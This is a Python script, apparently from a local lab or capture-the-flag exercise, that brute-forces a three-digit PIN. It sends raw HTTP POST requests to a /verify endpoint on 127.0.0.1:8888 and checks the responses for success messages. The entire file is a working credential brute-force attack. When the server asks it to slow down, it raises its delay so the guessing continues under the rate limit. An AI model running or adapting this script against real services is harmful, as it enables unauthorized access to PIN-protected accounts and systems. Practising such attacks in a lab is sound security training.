import socket
import time

# Specify the server and connection details
host = '127.0.0.1'  # The server IP
port = 8888          # Server port


delay = 1.0 # delay between attempts, for me this is the most important because if its to fast, the server won't recognize it or something

# loop through all the pins from 000 to 999
for pin_number in range(1000):
    pin_str = f"{pin_number:03d}"  

    try:
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((host, port))

           # prepares the POST body with the current PIN
            post_body = f"magicNumber={pin_str}"

            # construct HTTP post request
            http_request = (
                f"POST /verify HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(post_body)}\r\n"
                "Connection: close\r\n"
                "\r\n"
                f"{post_body}"
            )

            # sends the HTTP requests to the server
            sock.sendall(http_request.encode())

            
            response_data = b""
            while True:
                chunk = sock.recv(4096) #receives chunk of data from the server
                if not chunk:
                    break
                response_data += chunk

            
            response_text = response_data.decode(errors="ignore")

            
            if any(success_msg in response_text.lower() for success_msg in ["congratulations", "access granted", "welcome"]):
                print(f"[+] Correct PIN found: {pin_str}")
                print(response_text)  
                break#stops the loop if the correct pin is found
            elif "slow down" in response_text.lower():
                print(f"[!] Server requested to slow down after trying PIN {pin_str}. Increasing delay...")
                delay += 0.5 #Increse in delay
            else:
                print(f"[-] Attempted PIN: {pin_str}") #print the attempted incorrect PIN

    except Exception as error: # prints the error if there is one during the process
        print(f"[!] Error encountered with PIN {pin_str}: {error}")

    time.sleep(delay)  # The gap between the next attempt